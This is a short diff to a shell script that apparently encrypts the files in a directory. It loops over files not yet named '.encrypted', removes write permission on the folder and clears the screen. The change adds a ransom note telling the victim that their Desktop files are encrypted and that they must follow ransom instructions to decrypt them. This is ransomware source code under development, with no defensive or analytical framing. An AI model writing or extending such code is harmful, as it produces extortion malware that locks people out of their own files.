@@ -12,4 +12,6 @@ find "$DIR" -type f ! -name "*.encrypted" | while read -r file; do
 done
 chmod -w "$DIR"
 clear
+echo "Desktop Files have been encrypted."
+echo "Follow ransom instructions to get decrypt them."
 
